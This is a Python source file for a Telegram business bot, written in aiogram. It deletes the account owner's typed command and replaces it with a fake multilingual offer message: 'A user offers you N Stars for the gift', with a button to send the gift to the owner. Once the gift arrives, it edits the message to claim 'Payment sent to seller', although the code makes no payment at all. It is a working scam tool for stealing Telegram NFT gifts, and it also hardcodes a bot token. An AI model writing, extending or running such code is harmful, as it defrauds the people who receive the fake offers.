import asyncio, re, random, string, logging
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions, BusinessConnection,
)
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8516600626:AAHkWQ2mdcqPfzR5gNe_a5uMfZB13y7P8-A"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}

E_GEM, E_TIMER, E_GIFT, E_STAR, E_CHECK, E_LOCK = (
    "5318901904686754959", "6037268453759389862", "5773677501825945508",
    "6028338546736107668", "5774022692642492953", "5774077015388852135",
)

# bcid -> {"username": str|None, "user_id": int}
BIZ_OWNERS: dict[str, dict] = {}

# order_id -> dict(meta)
PENDING: dict[str, dict] = {}
# (bcid, gift_slug, gift_num) -> order_id
GIFT_INDEX: dict[tuple, str] = {}


def em(i, f):
    return f'<tg-emoji emoji-id="{i}">{f}</tg-emoji>'


T = {
    "ru": {
        "o1": "Пользователь предлагает вам",
        "of": "за подарок",
        "ot": "Оффер действителен ещё 6 ч.",
        "ofx": "Для принятия оффера передайте подарок.",
        "ap": "за подарок",
        "or": "Заказ",
        "bg": "Передать подарок",
        "st": "Звёзд",
        "gr": "GRAM",
        "rec": "получатель",
        "acc": "Подарок принят",
        "accx": "Оплата отправлена продавцу.",
        "done": "Сделка завершена",
    },
    "ukr": {
        "o1": "Користувач пропонує вам",
        "of": "за подарунок",
        "ot": "Пропозиція дійсна ще 6 год.",
        "ofx": "Для прийняття пропозиції передайте подарунок.",
        "ap": "за подарунок",
        "or": "Замовлення",
        "bg": "Передати подарунок",
        "st": "Зірок",
        "gr": "GRAM",
        "rec": "отримувач",
        "acc": "Подарунок прийнято",
        "accx": "Оплату надіслано продавцю.",
        "done": "Угоду завершено",
    },
    "eng": {
        "o1": "A user offers you",
        "of": "for the gift",
        "ot": "Offer valid for another 6 h.",
        "ofx": "To accept the offer, send the gift.",
        "ap": "for the gift",
        "or": "Order",
        "bg": "Send gift",
        "st": "Stars",
        "gr": "GRAM",
        "rec": "recipient",
        "acc": "Gift accepted",
        "accx": "Payment sent to seller.",
        "done": "Deal completed",
    },
    "cn": {
        "o1": "用户向您提出报价",
        "of": "购买礼物",
        "ot": "报价还有效 6 小时。",
        "ofx": "要接受报价，请发送礼物。",
        "ap": "购买礼物",
        "or": "订单",
        "bg": "发送礼物",
        "st": "星",
        "gr": "GRAM",
        "rec": "接收者",
        "acc": "礼物已接收",
        "accx": "付款已发送给卖家。",
        "done": "交易完成",
    },
}


def t(l, k):
    return T.get(l, T["ru"]).get(k, T["ru"][k])


def get_recipient(bcid: str) -> tuple[str | None, int | None]:
    info = BIZ_OWNERS.get(bcid)
    if not info:
        return None, None
    return info.get("username"), info.get("user_id")


def parse_command(text):
    if not text:
        return None
    parts = text.strip().split()
    if not parts:
        return None
    if parts[0].startswith("/"):
        parts = parts[1:]
    if parts and parts[0].startswith("@"):
        parts = parts[1:]
    if not parts:
        return None

    link, amount = None, None
    currency, lang = "STARS", "ru"

    for p in parts:
        low = p.lower()
        if link is None and (p.startswith("http") or p.startswith("t.me")):
            link = p
            continue
        if low in LANG_TAGS:
            if low == "ru":
                lang = "ru"
            elif low in ("ukr", "uk"):
                lang = "ukr"
            elif low in ("eng", "en"):
                lang = "eng"
            elif low in ("cn", "zh"):
                lang = "cn"
            continue
        if low == "gram":
            currency = "GRAM"
            continue
        if low in ("stars", "star", "звёзд", "звезд", "звёзды", "звезды"):
            currency = "STARS"
            continue
        if amount is None:
            try:
                amount = int(float(p.replace(",", ".")))
            except ValueError:
                pass

    if not link or amount is None:
        return None
    return link, amount, currency, lang


def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m:
        return None
    slug, num = m.group(1), m.group(2)
    name = re.sub(r"(?<!^)(?=[A-Z])", " ", slug)
    return name, num, slug


def amount_line(amount, currency, lang):
    if currency == "GRAM":
        return f'{em(E_GEM, "💎")} <b>{amount} {t(lang, "gr")}</b>'
    return f'{em(E_STAR, "⭐")} <b>{amount} {t(lang, "st")}</b>'


def rec_tag(username: str | None, user_id: int | None) -> str:
    if username:
        return f"@{username}"
    if user_id:
        return f'<a href="tg://user?id={user_id}">id{user_id}</a>'
    return "—"


def build_offer_plain(amount, currency, gift_name, gift_num, order_id, lang, username, user_id):
    return (
        f'{em(E_GIFT, "🎁")} {t(lang, "o1")}\n'
        f'{amount_line(amount, currency, lang)} {t(lang, "of")} <b>{gift_name} #{gift_num}</b>.\n\n'
        f'{em(E_TIMER, "⏱")} {t(lang, "ot")}\n'
        f'{em(E_LOCK, "🔒")} {t(lang, "ofx")}\n\n'
        f'<i>{t(lang, "or")} #{order_id}, {t(lang, "rec")} {rec_tag(username, user_id)}</i>'
    )


def build_offer_linked(amount, currency, gift_name, gift_num, order_id, lang, url, username, user_id):
    return (
        f'{em(E_GIFT, "🎁")} {t(lang, "o1")}\n'
        f'{amount_line(amount, currency, lang)} {t(lang, "of")} '
        f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>.\n\n'
        f'{em(E_TIMER, "⏱")} {t(lang, "ot")}\n'
        f'{em(E_LOCK, "🔒")} {t(lang, "ofx")}\n\n'
        f'<i>{t(lang, "or")} #{order_id}, {t(lang, "rec")} {rec_tag(username, user_id)}</i>'
    )


def build_offer_accepted(amount, currency, gift_name, gift_num, order_id, lang, url):
    return (
        f'{em(E_CHECK, "✅")} <b>{t(lang, "acc")}</b>\n'
        f'{amount_line(amount, currency, lang)} {t(lang, "ap")} '
        f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>.\n\n'
        f'{em(E_LOCK, "🔒")} {t(lang, "accx")}\n\n'
        f'<i>{t(lang, "or")} #{order_id} — {t(lang, "done")}</i>'
    )


def make_offer_keyboard(lang, username: str | None, user_id: int | None):
    if username:
        url = f"tg://send_gift?to={username}"
    elif user_id:
        url = f"tg://user?id={user_id}"
    else:
        url = "tg://settings"
    return InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(
                text=t(lang, "bg"),
                url=url,
                icon_custom_emoji_id=E_GIFT,
            )
        ]]
    )


def oid():
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))


def extract_gift_ref(message: Message):
    for attr in ("unique_gift", "gift"):
        obj = getattr(message, attr, None)
        if obj is None:
            continue
        g = getattr(obj, "gift", obj)
        name = getattr(g, "name", None) or getattr(g, "title", None)
        num = getattr(g, "number", None)
        if name and num is not None:
            slug = name.replace(" ", "")
            return slug, str(num)

    txt = (message.text or message.caption or "")
    m = GIFT_RE.search(txt)
    if m:
        return m.group(1), m.group(2)

    for ent_list in (message.entities or [], message.caption_entities or []):
        for ent in ent_list:
            url = getattr(ent, "url", None) or ""
            m = GIFT_RE.search(url)
            if m:
                return m.group(1), m.group(2)

    return None


async def try_finalize(message: Message, bcid: str):
    ref = extract_gift_ref(message)
    if not ref:
        return False
    slug, num = ref
    order_id = GIFT_INDEX.get((bcid, slug, num))
    if not order_id:
        return False
    meta = PENDING.get(order_id)
    if not meta:
        return False

    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"],
            message_id=meta["msg_id"],
            text=build_offer_accepted(
                meta["amount"], meta["currency"],
                meta["gift_name"], meta["gift_num"],
                order_id, meta["lang"], meta["nft_url"],
            ),
            reply_markup=None,
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=False,
            ),
        )
    except TelegramBadRequest as e:
        logging.error(f"finalize edit: {e}")
        return False

    PENDING.pop(order_id, None)
    GIFT_INDEX.pop((bcid, slug, num), None)
    return True


async def ensure_owner(bcid: str):
    """Если BIZ_OWNERS пуст (бот стартанул после подключения) — подтягиваем вручную."""
    if bcid in BIZ_OWNERS:
        return
    try:
        bc = await bot.get_business_connection(bcid)
        BIZ_OWNERS[bcid] = {
            "username": bc.user.username,
            "user_id": bc.user.id,
        }
        logging.info(
            f"biz_conn FETCHED: bcid={bcid} user_id={bc.user.id} username={bc.user.username}"
        )
    except Exception as e:
        logging.error(f"get_business_connection failed: {e}")


@dp.business_connection()
async def handle_business_connection(bc: BusinessConnection):
    user = bc.user
    if bc.is_enabled:
        BIZ_OWNERS[bc.id] = {
            "username": user.username,
            "user_id": user.id,
        }
        logging.info(
            f"biz_conn ON: bcid={bc.id} user_id={user.id} username={user.username}"
        )
    else:
        BIZ_OWNERS.pop(bc.id, None)
        logging.info(f"biz_conn OFF: bcid={bc.id}")


@dp.business_message()
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return

    await ensure_owner(bcid)

    if await try_finalize(message, bcid):
        return

    if not message.text:
        return

    parsed = parse_command(message.text)
    if not parsed:
        return

    username, user_id = get_recipient(bcid)
    if not username and not user_id:
        logging.warning(f"no owner info for bcid={bcid}, skipping offer")
        return

    link, amount, currency, lang = parsed
    gift = parse_gift(link)
    if not gift:
        return
    gift_name, gift_num, slug = gift
    nft_url = f"https://t.me/nft/{slug}-{gift_num}"
    order_id = oid()

    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            text=build_offer_plain(
                amount, currency, gift_name, gift_num, order_id, lang,
                username, user_id,
            ),
            reply_markup=make_offer_keyboard(lang, username, user_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"send error: {e}")
        return

    try:
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[message.message_id],
        )
    except Exception as e:
        logging.error(f"del: {e}")

    PENDING[order_id] = {
        "chat_id": message.chat.id,
        "msg_id": sent.message_id,
        "bcid": bcid,
        "amount": amount,
        "currency": currency,
        "gift_name": gift_name,
        "gift_num": gift_num,
        "gift_slug": slug,
        "lang": lang,
        "nft_url": nft_url,
        "username": username,
        "user_id": user_id,
    }
    GIFT_INDEX[(bcid, slug, gift_num)] = order_id

    await asyncio.sleep(1.5)
    try:
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=sent.message_id,
            text=build_offer_linked(
                amount, currency, gift_name, gift_num, order_id, lang, nft_url,
                username, user_id,
            ),
            reply_markup=make_offer_keyboard(lang, username, user_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=False,
            ),
        )
    except TelegramBadRequest as e:
        logging.error(f"edit error: {e}")


@dp.edited_business_message()
async def handle_edited_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return
    await try_finalize(message, bcid)


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "🎁 Пришли ссылку на подарок, язык и сумму, например:\n"
        "https://t.me/nft/PreciousPeach-664 ru 21222 STARS"
    )


async def main():
    await dp.start_polling(
        bot,
        allowed_updates=[
            "business_connection",
            "business_message",
            "edited_business_message",
        ],
    )


if __name__ == "__main__":
    asyncio.run(main())
